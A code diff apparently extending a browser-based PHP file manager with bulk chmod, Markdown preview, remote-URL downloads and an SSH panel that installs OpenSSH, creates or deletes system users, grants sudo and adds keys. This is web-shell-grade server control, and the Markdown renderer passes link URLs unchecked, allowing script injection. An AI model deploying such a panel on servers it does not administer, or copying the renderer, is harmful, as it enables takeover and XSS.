     isDir?{icon:'<ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/>',label:'Calc Size',cls:'',act:()=>calcDirSize(name,null)}:null,
@@ -2071,6 +3249,14 @@ function refreshBulk(){
 checkAll?.addEventListener('change',()=>{getChecks().forEach(c=>c.checked=checkAll.checked);refreshBulk();});
 document.addEventListener('change',e=>{if(e.target.classList.contains('item-ck'))refreshBulk();});
 document.getElementById('bkDel')?.addEventListener('click',()=>{const s=selNames();if(!s.length)return;if(!confirm(`Delete ${s.length} item(s)?`))return;af('bulk_delete',{items:JSON.stringify(s)});});
+document.getElementById('bkChmod')?.addEventListener('click',()=>{const s=selNames();if(!s.length)return;bulkChmodItems=s;document.getElementById('bcTitle').textContent=`Change Permissions - ${s.length} item(s)`;openMod('bulkChmodOv');});
+let bulkChmodItems=[];
+document.getElementById('bcApply')?.addEventListener('click',()=>{
+  const perm=document.getElementById('bcPerm').value.trim();
+  if(!/^[0-7]{3,4}$/.test(perm)){toast('Enter a valid permission (e.g. 755)');return;}
+  af('bulk_chmod',{items:JSON.stringify(bulkChmodItems),perm});
+});
+document.getElementById('bcClose')?.addEventListener('click',()=>closeMod('bulkChmodOv'));
 document.getElementById('bkZip')?.addEventListener('click',()=>{const s=selNames();if(!s.length)return;af('zip_create',{items:JSON.stringify(s)});});
 document.getElementById('bkTar')?.addEventListener('click',()=>{const s=selNames();if(!s.length)return;af('tar_create',{items:JSON.stringify(s)});});
 document.getElementById('bkCopy')?.addEventListener('click',()=>{const s=selNames();if(!s.length)return;const t=prompt('Copy to:',CWD);if(t)af('bulk_copy',{items:JSON.stringify(s),target:t.trim()});});
@@ -2094,25 +3280,82 @@ document.addEventListener('click',e=>{
 ═══════════════════════════════════════ */
 const prevOv=document.getElementById('prevOv');
 const prevBody=document.getElementById('prevBody');
+let mdRawText='',mdShowingSource=false;
 function openPreview(url,type,fname){
   document.getElementById('prevName').textContent=fname;
   document.getElementById('prevDl').href=url+'&dl=1';
   prevBody.innerHTML='';
+  const mdToggle=document.getElementById('prevMdToggle');mdToggle.style.display='none';
   if(type==='image'){const img=document.createElement('img');img.src=url;prevBody.appendChild(img);}
   else if(type==='video'){const v=document.createElement('video');v.src=url;v.controls=true;v.autoplay=true;prevBody.appendChild(v);}
   else if(type==='pdf'){const fr=document.createElement('iframe');fr.src=url;prevBody.appendChild(fr);}
+  else if(type==='markdown'){
+    mdShowingSource=false;document.getElementById('prevMdToggleLabel').textContent='View Source';mdToggle.style.display='';
+    const div=document.createElement('div');div.className='md-render';div.innerHTML='Loading…';prevBody.appendChild(div);
+    fetch(url).then(r=>r.text()).then(t=>{mdRawText=t.length>200000?t.slice(0,200000)+'\n…(truncated)':t;div.innerHTML=mdToHtml(mdRawText);}).catch(()=>{div.textContent='Could not load file.';});
+  }
   else{const pre=document.createElement('pre');pre.textContent='Loading…';prevBody.appendChild(pre);fetch(url).then(r=>r.text()).then(t=>{pre.textContent=t.length>200000?t.slice(0,200000)+'\n…(truncated)':t;}).catch(()=>{pre.textContent='Could not load file.';});}
   prevOv.classList.add('open');
 }
+document.getElementById('prevMdToggle')?.addEventListener('click',()=>{
+  mdShowingSource=!mdShowingSource;
+  document.getElementById('prevMdToggleLabel').textContent=mdShowingSource?'View Rendered':'View Source';
+  prevBody.innerHTML='';
+  if(mdShowingSource){const pre=document.createElement('pre');pre.textContent=mdRawText;prevBody.appendChild(pre);}
+  else{const div=document.createElement('div');div.className='md-render';div.innerHTML=mdToHtml(mdRawText);prevBody.appendChild(div);}
+});
 document.getElementById('prevClose')?.addEventListener('click',()=>{prevOv.classList.remove('open');prevBody.innerHTML='';});
 prevOv.addEventListener('click',e=>{if(e.target===prevOv){prevOv.classList.remove('open');prevBody.innerHTML='';}});
+
+/* Lightweight Markdown → HTML renderer (no external deps) */
+function mdEsc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function mdInline(s){
+  s=mdEsc(s);
+  s=s.replace(/`([^`]+)`/g,'<code>$1</code>');
+  s=s.replace(/\*\*([^*]+)\*\*/g,'<strong>$1</strong>');
+  s=s.replace(/__([^_]+)__/g,'<strong>$1</strong>');
+  s=s.replace(/\*([^*]+)\*/g,'<em>$1</em>');
+  s=s.replace(/(?<!_)_([^_]+)_(?!_)/g,'<em>$1</em>');
+  s=s.replace(/~~([^~]+)~~/g,'<del>$1</del>');
+  s=s.replace(/!\[([^\]]*)\]\(([^)]+)\)/g,'<img alt="$1" src="$2" style="max-width:100%">');
+  s=s.replace(/\[([^\]]*)\]\(([^)]+)\)/g,'<a href="$2" target="_blank" rel="noopener">$1</a>');
+  return s;
+}
+function mdToHtml(md){
+  const lines=md.replace(/\r\n/g,'\n').split('\n');
+  let html='',inCode=false,codeLang='',listType=null,inBlockquote=false;
+  const closeList=()=>{if(listType){html+=listType==='ul'?'</ul>':'</ol>';listType=null;}};
+  const closeQuote=()=>{if(inBlockquote){html+='</blockquote>';inBlockquote=false;}};
+  for(let i=0;i<lines.length;i++){
+    let line=lines[i];
+    const fence=line.match(/^```(.*)$/);
+    if(fence){
+      if(!inCode){closeList();closeQuote();inCode=true;codeLang=fence[1].trim();html+='<pre><code>';}
+      else{inCode=false;html+='</code></pre>';}
+      continue;
+    }
+    if(inCode){html+=mdEsc(line)+'\n';continue;}
+    if(/^\s*$/.test(line)){closeList();closeQuote();continue;}
+    let m;
+    if((m=line.match(/^(#{1,6})\s+(.*)$/))){closeList();closeQuote();const lvl=m[1].length;html+=`<h${lvl}>${mdInline(m[2])}</h${lvl}>`;continue;}
+    if(/^\s*(-{3,}|\*{3,}|_{3,})\s*$/.test(line)){closeList();closeQuote();html+='<hr>';continue;}
+    if((m=line.match(/^\s*>\s?(.*)$/))){closeList();if(!inBlockquote){html+='<blockquote>';inBlockquote=true;}html+=`<p>${mdInline(m[1])}</p>`;continue;}
+    if((m=line.match(/^\s*[-*+]\s+(.*)$/))){closeQuote();if(listType!=='ul'){closeList();html+='<ul>';listType='ul';}html+=`<li>${mdInline(m[1])}</li>`;continue;}
+    if((m=line.match(/^\s*\d+[.)]\s+(.*)$/))){closeQuote();if(listType!=='ol'){closeList();html+='<ol>';listType='ol';}html+=`<li>${mdInline(m[1])}</li>`;continue;}
+    closeList();closeQuote();
+    html+=`<p>${mdInline(line)}</p>`;
+  }
+  closeList();closeQuote();
+  if(inCode)html+='</code></pre>';
+  return html;
+}
 
 /* ═══════════════════════════════════════
    CHECKSUM MODAL
 ═══════════════════════════════════════ */
 document.getElementById('hashClose')?.addEventListener('click',()=>closeMod('hashOv'));
 async function openHash(filename){
-  document.getElementById('hashTitle').textContent='Checksum — '+filename;
+  document.getElementById('hashTitle').textContent='Checksum - '+filename;
   document.getElementById('hashBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Computing…</div>';
   openMod('hashOv');
   try{
@@ -2127,6 +3370,51 @@ async function openHash(filename){
   }catch{document.getElementById('hashBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
 }
 function hr(l,h){return `<div class="hash-r"><div class="hash-l">${l}</div><div class="hash-v" data-c="${h}" title="Click to copy">${h}</div></div>`;}
+
+async function copyFileContent(name){
+  try{
+    const url='?raw='+encodeURIComponent(name)+'&dir='+encodeURIComponent(CWD);
+    const txt=await fetch(url).then(r=>r.text());
+    await navigator.clipboard.writeText(txt);
+    toast('Content copied to clipboard!');
+  }catch{toast('Failed to copy content.');}
+}
+
+/* ═══════════════════════════════════════
+   TAGS / LABELS
+═══════════════════════════════════════ */
+const TAG_COLORS=['#ef4444','#f97316','#f59e0b','#22c55e','#06b6d4','#3b82f6','#8b5cf6','#ec4899'];
+function openTag(name){
+  document.getElementById('tagTitle').textContent='Tag - '+name;
+  document.getElementById('tagItemName').value=name;
+  document.getElementById('tagLabel').value='';
+  const sw=document.getElementById('tagSwatches');
+  sw.innerHTML=TAG_COLORS.map(c=>`<div class="tag-sw" data-c="${c}" style="width:26px;height:26px;border-radius:50%;background:${c};cursor:pointer;display:inline-block;margin:3px;border:2px solid transparent"></div>`).join('');
+  let picked=TAG_COLORS[0];
+  sw.querySelectorAll('.tag-sw').forEach(el=>{
+    el.addEventListener('click',()=>{picked=el.dataset.c;sw.querySelectorAll('.tag-sw').forEach(e2=>e2.style.borderColor='transparent');el.style.borderColor='var(--t1)';});
+  });
+  sw.firstElementChild.style.borderColor='var(--t1)';
+  document.getElementById('tagApply').onclick=()=>{af('set_tag',{item_name:name,color:picked,label:document.getElementById('tagLabel').value});};
+  document.getElementById('tagRemove').onclick=()=>{af('remove_tag',{item_name:name});};
+  openMod('tagOv');
+}
+document.getElementById('tagClose')?.addEventListener('click',()=>closeMod('tagOv'));
+
+/* ═══════════════════════════════════════
+   REMOTE URL DOWNLOAD
+═══════════════════════════════════════ */
+document.getElementById('remoteDlBtn')?.addEventListener('click',()=>{
+  document.getElementById('rdUrl').value='';document.getElementById('rdName').value='';
+  document.getElementById('rdCwd').textContent=CWD;
+  openMod('remoteDlOv');
+});
+document.getElementById('remoteDlClose')?.addEventListener('click',()=>closeMod('remoteDlOv'));
+document.getElementById('rdApply')?.addEventListener('click',()=>{
+  const url=document.getElementById('rdUrl').value.trim();
+  if(!/^https?:\/\//i.test(url)){toast('Enter a valid http(s) URL');return;}
+  af('remote_download',{url,fname:document.getElementById('rdName').value.trim()});
+});
 
 /* ═══════════════════════════════════════
    ACTIVITY LOG
@@ -2152,7 +3440,7 @@ document.getElementById('srvBtn')?.addEventListener('click',async()=>{
   try{
     const d=await fetch('?x=sv').then(r=>r.json());
     document.getElementById('srvBody').innerHTML=`<div style="padding:16px">
-      <div class="info-g">${[['Hostname',d.hostname||'—',''],['Server IP',d.server_ip||'—',''],['Client IP',d.client_ip||'—',''],['Uptime',d.uptime||'—',''],['CPU Cores',d.cpu_cores||'n/a',d.cpu_model||''],['CPU Load',d.load?d.load.join(' / '):'n/a','1m / 5m / 15m'],['RAM Usage',d.mem_pct!=null?d.mem_pct+'%':'n/a',d.mem_used?d.mem_used+' / '+d.mem_total:''],['PHP Version',d.php,'Runtime'],['OS',d.os,''],['Web Server',d.server,''],['SAPI',d.sapi,''],['Memory Limit',d.memory_limit,'Peak: '+d.mem_peak],['PHP Memory Usage',d.mem_usage,''],['Disk Total',d.disk_total,'Free: '+d.disk_free+' ('+d.disk_pct+'% used)'],['Upload Max',d.upload_max,'POST Max: '+d.post_max],['Max Exec',d.max_exec,''],['Timezone',d.tz,'']].map(([l,v,s])=>`<div class="info-c"><div class="info-cl">${l}</div><div class="info-cv">${esc(String(v))}</div>${s?`<div class="info-cs">${esc(s)}</div>`:''}</div>`).join('')}</div>
+      <div class="info-g">${[['Hostname',d.hostname||'-',''],['Server IP',d.server_ip||'-',''],['Client IP',d.client_ip||'-',''],['Uptime',d.uptime||'-',''],['CPU Cores',d.cpu_cores||'n/a',d.cpu_model||''],['CPU Load',d.load?d.load.join(' / '):'n/a','1m / 5m / 15m'],['RAM Usage',d.mem_pct!=null?d.mem_pct+'%':'n/a',d.mem_used?d.mem_used+' / '+d.mem_total:''],['PHP Version',d.php,'Runtime'],['OS',d.os,''],['Web Server',d.server,''],['SAPI',d.sapi,''],['Memory Limit',d.memory_limit,'Peak: '+d.mem_peak],['PHP Memory Usage',d.mem_usage,''],['Disk Total',d.disk_total,'Free: '+d.disk_free+' ('+d.disk_pct+'% used)'],['Upload Max',d.upload_max,'POST Max: '+d.post_max],['Max Exec',d.max_exec,''],['Timezone',d.tz,'']].map(([l,v,s])=>`<div class="info-c"><div class="info-cl">${l}</div><div class="info-cv">${esc(String(v))}</div>${s?`<div class="info-cs">${esc(s)}</div>`:''}</div>`).join('')}</div>
       <div style="font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t3);margin-bottom:8px">Extensions (${d.exts.length})</div>
       <div class="ext-wrap">${d.exts.sort().map(e=>`<span class="ext-tag">${esc(e)}</span>`).join('')}</div>
     </div>`;
@@ -2186,7 +3474,7 @@ async function loadLargeFiles(){
     const d=await fetch('?x=largefiles&mb='+encodeURIComponent(mb)).then(r=>r.json());
     if(!d.files||!d.files.length){document.getElementById('largeBody').innerHTML='<div class="empty" style="padding:40px"><p>No files above this size.</p></div>';return;}
     const rows=d.files.map(f=>`<tr><td style="font-family:'JetBrains Mono',monospace;font-size:12px">${esc(f.name)}</td><td style="color:var(--t2);font-size:11px;max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(fmtPath(f.dir))}">${esc(fmtPath(f.dir))}</td><td style="font-family:'JetBrains Mono',monospace;font-weight:700">${formatBytes(f.size)}</td><td><button class="btn btn-xs btn-red" onclick="delAbsPath('${esc(f.path).replace(/'/g,"\\'")}',this)">Delete</button></td></tr>`).join('');
-    document.getElementById('largeBody').innerHTML=`<div style="overflow:auto;max-height:65vh">${d.capped?'<div style="padding:8px 14px;font-size:11px;color:#fcd34d">Scan capped by time/count limit — showing partial results.</div>':''}<table class="log-t"><thead><tr><th>Name</th><th>Location</th><th>Size</th><th></th></tr></thead><tbody>${rows}</tbody></table></div>`;
+    document.getElementById('largeBody').innerHTML=`<div style="overflow:auto;max-height:65vh">${d.capped?'<div style="padding:8px 14px;font-size:11px;color:#fcd34d">Scan capped by time/count limit - showing partial results.</div>':''}<table class="log-t"><thead><tr><th>Name</th><th>Location</th><th>Size</th><th></th></tr></thead><tbody>${rows}</tbody></table></div>`;
   }catch{document.getElementById('largeBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
 }
 document.getElementById('largeBtn')?.addEventListener('click',()=>{openMod('largeOv');loadLargeFiles();});
@@ -2206,7 +3494,7 @@ document.getElementById('dupBtn')?.addEventListener('click',async()=>{
       <div style="font-size:11px;color:var(--t3);margin-bottom:6px">${g.files.length} copies · ${formatBytes(g.size)} each</div>
       ${g.files.map(f=>`<div style="display:flex;align-items:center;gap:8px;padding:3px 0"><span style="font-family:'JetBrains Mono',monospace;font-size:12px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(f.path)}">${esc(fmtPath(f.dir))}/${esc(f.name)}</span><button class="btn btn-xs btn-red" onclick="delAbsPath('${esc(f.path).replace(/'/g,"\\'")}',this)">Delete</button></div>`).join('')}
     </div>`).join('');
-    document.getElementById('dupBody').innerHTML=`<div style="overflow:auto;max-height:65vh">${d.capped?'<div style="padding:8px 14px;font-size:11px;color:#fcd34d">Scan capped by time/count limit — showing partial results.</div>':''}${html}</div>`;
+    document.getElementById('dupBody').innerHTML=`<div style="overflow:auto;max-height:65vh">${d.capped?'<div style="padding:8px 14px;font-size:11px;color:#fcd34d">Scan capped by time/count limit - showing partial results.</div>':''}${html}</div>`;
   }catch{document.getElementById('dupBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
 });
 document.getElementById('dupClose')?.addEventListener('click',()=>closeMod('dupOv'));
@@ -2231,7 +3519,7 @@ document.getElementById('errLogBtn')?.addEventListener('click',async()=>{
     if(d.error){document.getElementById('errLogBody').innerHTML='<div class="empty" style="padding:40px"><p>'+esc(d.error)+'</p></div>';return;}
     if(!d.path){document.getElementById('errLogBody').innerHTML='<div class="empty" style="padding:40px"><p>No error_log configured in php.ini.</p></div>';return;}
     if(!d.lines.length){document.getElementById('errLogBody').innerHTML='<div class="empty" style="padding:40px"><p>Log is empty.</p></div>';return;}
-    document.getElementById('errLogBody').innerHTML=`<div style="padding:8px 14px;font-size:10.5px;color:var(--t3);border-bottom:1px solid var(--border)">${esc(d.path)} — showing last ${d.lines.length} lines</div><pre style="margin:0;padding:14px;font-family:'JetBrains Mono',monospace;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:60vh;overflow:auto;color:var(--t2)">${esc(d.lines.join('\n'))}</pre>`;
+    document.getElementById('errLogBody').innerHTML=`<div style="padding:8px 14px;font-size:10.5px;color:var(--t3);border-bottom:1px solid var(--border)">${esc(d.path)} - showing last ${d.lines.length} lines</div><pre style="margin:0;padding:14px;font-family:'JetBrains Mono',monospace;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:60vh;overflow:auto;color:var(--t2)">${esc(d.lines.join('\n'))}</pre>`;
   }catch{document.getElementById('errLogBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
 });
 document.getElementById('errLogClose')?.addEventListener('click',()=>closeMod('errLogOv'));
@@ -2249,37 +3537,510 @@ document.getElementById('envBtn')?.addEventListener('click',async()=>{
 document.getElementById('envClose')?.addEventListener('click',()=>closeMod('envOv'));
 
 /* ═══════════════════════════════════════
+   SSH ACCESS (admin)
+═══════════════════════════════════════ */
+/* ═══════════════════════════════════════
+   SSH ACCESS - tabs: Server Status | User Management
+═══════════════════════════════════════ */
+let sshActiveTab='status';
+
+document.getElementById('sshBtn')?.addEventListener('click',()=>{
+  openMod('sshOv');
+  sshSwitchTab(sshActiveTab);
+});
+document.getElementById('sshClose')?.addEventListener('click',()=>closeMod('sshOv'));
+
+// Tab switching
+document.querySelectorAll('.ssh-tab-btn').forEach(btn=>{
+  btn.addEventListener('click',()=>sshSwitchTab(btn.dataset.tab));
+});
+
+function sshSwitchTab(tab){
+  sshActiveTab=tab;
+  document.querySelectorAll('.ssh-tab-btn').forEach(b=>{
+    const active=b.dataset.tab===tab;
+    b.style.color=active?'#818cf8':'var(--t3)';
+    b.style.borderBottomColor=active?'#818cf8':'transparent';
+  });
+  document.getElementById('sshBody').style.display     = tab==='status'?'':'none';
+  document.getElementById('sshUsersBody').style.display= tab==='users' ?'':'none';
+  if(tab==='status')  loadSshStatus();
+  if(tab==='users')   loadSshUsers();
+}
+
+/* ── Server Status tab ── */
+async function loadSshStatus(){
+  document.getElementById('sshBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Checking…</div>';
+  try{
+    const d=await fetch('?x=sshstatus').then(r=>r.json());
+    if(d.error){document.getElementById('sshBody').innerHTML='<div class="empty" style="padding:40px"><p>'+esc(d.error)+'</p></div>';return;}
+    const checkIco=()=>'<svg viewBox="0 0 24 24" style="width:12px;height:12px;stroke:currentColor;fill:none;stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;vertical-align:-1px;margin-left:3px"><polyline points="20 6 9 17 4 12"/></svg>';
+    const row=(l,v,ok)=>`<div class="info-c"><div class="info-cl">${l}</div><div class="info-cv" style="color:${ok?'#86efac':'#fca5a5'}">${v}</div></div>`;
+    let html=`<div class="info-g" style="grid-template-columns:1fr 1fr">
+      ${row('SSH Server',d.installed?'Installed'+checkIco():'Not installed',d.installed)}
+      ${row('SSH Client',d.client?'Available'+checkIco():'Not found',d.client)}
+      ${row('Running / Port 22',d.running?'Active'+checkIco():'Not running',d.running)}
+      ${row('Package Manager',d.pkg_mgr||'None detected',!!d.pkg_mgr)}
+    </div>`;
+    if(d.installed){
+      html+=`<div style="margin-top:14px;padding:12px 14px;background:rgba(134,239,172,.07);border:1px solid rgba(134,239,172,.2);border-radius:10px;font-size:12px;color:#86efac">SSH is installed and ready. Use the <strong>User Management</strong> tab to manage who can connect.</div>`;
+    } else {
+      html+=`<div style="margin-top:14px;font-size:11.5px;color:var(--t3)">${d.pkg_mgr?'You can attempt an automatic install below (requires root privileges).':'No supported package manager found - ask your host to enable SSH.'}</div>`;
+      if(d.pkg_mgr)html+=`<button type="button" id="sshInstallBtn" class="btn btn-p" style="width:100%;margin-top:12px">Install OpenSSH Server</button>`;
+    }
+    document.getElementById('sshBody').innerHTML=html;
+    document.getElementById('sshInstallBtn')?.addEventListener('click',async()=>{
+      if(!confirm('Install OpenSSH server? This requires root privileges.'))return;
+      document.getElementById('sshBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Installing…</div>';
+      const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','ssh_install');
+      await fetch('',{method:'POST',body:fd}).catch(()=>{});
+      toast('Install attempted - check the banner for result.');location.reload();
+    });
+  }catch{document.getElementById('sshBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed to check SSH status.</div>';}
+}
+
+/* ── User Management tab ── */
+async function loadSshUsers(){
+  const el=document.getElementById('sshUsersBody');
+  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading users…</div>';
+  try{
+    const users=await fetch('?x=sshusers').then(r=>r.json());
+    if(users.error){el.innerHTML='<div class="empty" style="padding:32px"><p>'+esc(users.error)+'</p></div>';return;}
+    if(!users.length){el.innerHTML='<div class="empty" style="padding:32px"><p>No user accounts found.</p></div>';return;}
+
+    let rows=users.map(u=>{
+      const shellShort=u.shell.split('/').pop();
+      const sudoBadge=u.sudo?`<span style="background:rgba(239,68,68,.15);color:#fca5a5;padding:1px 7px;border-radius:20px;font-size:10px;font-weight:700">SUDO</span>`:'';
+      const lockBadge=u.locked?`<span style="background:rgba(251,146,60,.12);color:#fb923c;padding:1px 7px;border-radius:20px;font-size:10px;font-weight:700">LOCKED</span>`:
+        `<span style="background:rgba(134,239,172,.1);color:#86efac;padding:1px 7px;border-radius:20px;font-size:10px;font-weight:700">ACTIVE</span>`;
+      const keyBadge=u.key_count>0?`<span style="background:rgba(129,140,248,.1);color:#818cf8;padding:1px 7px;border-radius:20px;font-size:10px;display:inline-flex;align-items:center;gap:3px"><svg viewBox="0 0 24 24" style="width:10px;height:10px;stroke:currentColor;fill:none;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round"><circle cx="7.5" cy="15.5" r="5.5"/><path d="M21 2l-9.6 9.6"/><path d="M15.5 7.5l3 3L22 7l-3-3"/></svg> ${u.key_count}</span>`:'';
+      return `<tr>
+        <td style="padding:10px 14px">
+          <div style="font-weight:600;color:var(--t1)">${esc(u.username)}</div>
+          <div style="font-size:11px;color:var(--t3)">UID ${u.uid} · ${esc(shellShort)}</div>
+        </td>
+        <td style="padding:10px 8px">${lockBadge}</td>
+        <td style="padding:10px 8px">${sudoBadge}</td>
+        <td style="padding:10px 8px">${keyBadge}</td>
+        <td style="padding:10px 14px;text-align:right">
+          <button class="btn btn-s ssh-edit-btn" data-u='${JSON.stringify(u).replace(/'/g,"&#39;")}' style="font-size:11px;padding:4px 10px">Manage</button>
+          <button class="btn btn-s ssh-del-btn" data-u="${esc(u.username)}" style="font-size:11px;padding:4px 10px;margin-left:4px;color:#fca5a5;border-color:rgba(239,68,68,.3)">Delete</button>
+        </td>
+      </tr>`;
+    }).join('');
+
+    el.innerHTML=`
+      <div style="padding:14px 18px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--b2)">
+        <span style="font-size:13px;color:var(--t2)">${users.length} system user${users.length!==1?'s':''}</span>
+        <button id="sshAddUserBtn" class="btn btn-p" style="font-size:12px;padding:6px 14px">+ New User</button>
+      </div>
+      <div style="overflow:auto;max-height:360px">
+      <table style="width:100%;border-collapse:collapse">
+        <thead><tr style="font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--t3);border-bottom:1px solid var(--b2)">
+          <th style="padding:8px 14px;text-align:left">Account</th>
+          <th style="padding:8px 8px;text-align:left">Status</th>
+          <th style="padding:8px 8px;text-align:left">Sudo</th>
+          <th style="padding:8px 8px;text-align:left">Keys</th>
+          <th style="padding:8px 14px;text-align:right">Actions</th>
+        </tr></thead>
+        <tbody>${rows}</tbody>
+      </table></div>`;
+
+    // Add user button
+    document.getElementById('sshAddUserBtn').addEventListener('click',()=>{
+      document.getElementById('sshAddUser').value='';document.getElementById('sshAddPass').value='';
+      document.getElementById('sshAddKey').value='';document.getElementById('sshAddSudo').checked=false;
+      document.getElementById('sshAddShell').value='/bin/bash';
+      openMod('sshAddOv');
+    });
+
+    // Manage / edit button
+    el.querySelectorAll('.ssh-edit-btn').forEach(btn=>{
+      btn.addEventListener('click',()=>{
+        const u=JSON.parse(btn.dataset.u.replace(/&#39;/g,"'"));
+        document.getElementById('sshEditUser').value=u.username;
+        document.getElementById('sshEditTitle').textContent='Manage: '+u.username;
+        document.getElementById('sshEditShell').value=u.shell||'/bin/bash';
+        document.getElementById('sshEditPass').value='';document.getElementById('sshEditKey').value='';
+        // sudo toggle button
+        const sudoBtn=document.getElementById('sshEditSudoBtn');
+        if(u.sudo){sudoBtn.textContent='Remove Sudo';sudoBtn.dataset.action='remove_sudo';sudoBtn.style.color='#fca5a5';sudoBtn.style.borderColor='rgba(239,68,68,.3)';}
+        else{sudoBtn.textContent='Grant Sudo';sudoBtn.dataset.action='add_sudo';sudoBtn.style.color='#86efac';sudoBtn.style.borderColor='rgba(134,239,172,.3)';}
+        // lock/unlock button
+        const lockBtn=document.getElementById('sshEditLockBtn');
+        if(u.locked){lockBtn.textContent='Unlock Account';lockBtn.dataset.action='unlock';lockBtn.style.color='#86efac';lockBtn.style.borderColor='rgba(134,239,172,.3)';}
+        else{lockBtn.textContent='Lock Account';lockBtn.dataset.action='lock';lockBtn.style.color='#fb923c';lockBtn.style.borderColor='rgba(251,146,60,.3)';}
+        openMod('sshEditOv');
+      });
+    });
+
+    // Delete button
+    el.querySelectorAll('.ssh-del-btn').forEach(btn=>{
+      btn.addEventListener('click',async()=>{
+        const uname=btn.dataset.u;
+        if(!confirm(`Delete system user "${uname}"? This will remove their home directory too.`))return;
+        const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','ssh_delete_user');fd.append('ssh_user',uname);
+        const r=await sshPost(fd);
+        if(!r.ok&&r.text){alert(r.text);return;}
+        loadSshUsers();
+      });
+    });
+
+  }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Failed to load users: '+esc(String(e))+'</div>';}
+}
+
+/* ── Shared helpers ── */
+
+/** POST and parse the PHP flash message from the response HTML.
+ *  Returns {ok:bool, text:string, type:'success'|'danger'|'warning'} */
+async function sshPost(fd){
+  try{
+    const resp=await fetch('',{method:'POST',body:fd});
+    const html=await resp.text();
+    const doc=new DOMParser().parseFromString(html,'text/html');
+    const alert=doc.querySelector('.alert');
+    if(!alert)return{ok:true,text:'',type:'success'};
+    // extract text without the SVG icon
+    const clone=alert.cloneNode(true);
+    clone.querySelectorAll('svg').forEach(s=>s.remove());
+    const text=clone.textContent.trim();
+    const type=alert.classList.contains('danger')?'danger':
+                alert.classList.contains('warning')?'warning':'success';
+    return{ok:type==='success'||type==='warning',text,type};
+  }catch(e){return{ok:false,text:'Network error: '+e.message,type:'danger'};}
+}
+
+/** Render a coloured feedback bar inside a modal element */
+function sshShowMsg(containerId, text, type){
+  let bar=document.getElementById(containerId);
+  if(!bar)return;
+  const colors={
+    success:{bg:'rgba(134,239,172,.1)',border:'rgba(134,239,172,.3)',color:'#86efac'},
+    warning:{bg:'rgba(251,191,36,.08)',border:'rgba(251,191,36,.25)',color:'#fcd34d'},
+    danger :{bg:'rgba(239,68,68,.1)',  border:'rgba(239,68,68,.3)',  color:'#fca5a5'},
+  };
+  const c=colors[type]||colors.danger;
+  bar.innerHTML=`<div style="margin-bottom:12px;padding:10px 14px;border-radius:8px;font-size:12.5px;line-height:1.5;
+    background:${c.bg};border:1px solid ${c.border};color:${c.color}">${esc(text)}</div>`;
+}
+
+/* ── Add user form ── */
+document.getElementById('sshAddClose')?.addEventListener('click',()=>closeMod('sshAddOv'));
+document.getElementById('sshAddApply')?.addEventListener('click',async()=>{
+  const uname=document.getElementById('sshAddUser').value.trim();
+  if(!uname){sshShowMsg('sshAddFeedback','Username is required.','danger');return;}
+  const fd=new FormData();
+  fd.append('csrf_token',CSRF);fd.append('action','ssh_create_user');
+  fd.append('ssh_user',uname);
+  fd.append('ssh_pass',document.getElementById('sshAddPass').value);
+  fd.append('ssh_shell',document.getElementById('sshAddShell').value);
+  fd.append('ssh_key',document.getElementById('sshAddKey').value);
+  if(document.getElementById('sshAddSudo').checked)fd.append('ssh_sudo','1');
+  const btn=document.getElementById('sshAddApply');
+  btn.textContent='Creating…';btn.disabled=true;
+  document.getElementById('sshAddFeedback').innerHTML='';
+  const r=await sshPost(fd);
+  btn.textContent='Create SSH User';btn.disabled=false;
+  if(r.text)sshShowMsg('sshAddFeedback',r.text,r.type);
+  if(r.ok&&r.type==='success'){
+    setTimeout(()=>{closeMod('sshAddOv');loadSshUsers();},900);
+  }
+});
+
+/* ── Edit user form ── */
+document.getElementById('sshEditClose')?.addEventListener('click',()=>closeMod('sshEditOv'));
+
+async function sshActPost(action,extra={}){
+  const uname=document.getElementById('sshEditUser').value;
+  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','ssh_update_user');
+  fd.append('ssh_user',uname);fd.append('ssh_action',action);
+  Object.entries(extra).forEach(([k,v])=>fd.append(k,v));
+  document.getElementById('sshEditFeedback').innerHTML='';
+  const r=await sshPost(fd);
+  if(r.text)sshShowMsg('sshEditFeedback',r.text,r.type);
+  if(r.ok&&r.type==='success'){
+    setTimeout(()=>{closeMod('sshEditOv');loadSshUsers();},900);
+  } else if(r.ok&&r.type==='warning'){
+    setTimeout(()=>{closeMod('sshEditOv');loadSshUsers();},900);
+  }
+}
+
+document.getElementById('sshEditPassBtn')?.addEventListener('click',()=>{
+  const p=document.getElementById('sshEditPass').value;
+  if(!p||p.length<6){sshShowMsg('sshEditFeedback','Password must be at least 6 characters.','danger');return;}
+  sshActPost('change_pass',{ssh_pass:p});
+});
+document.getElementById('sshEditShellBtn')?.addEventListener('click',()=>{
+  sshActPost('change_shell',{ssh_shell:document.getElementById('sshEditShell').value});
+});
+document.getElementById('sshEditKeyBtn')?.addEventListener('click',()=>{
+  const k=document.getElementById('sshEditKey').value.trim();
+  if(!k){sshShowMsg('sshEditFeedback','Paste a public key first.','danger');return;}
+  sshActPost('add_key',{ssh_key:k});
+});
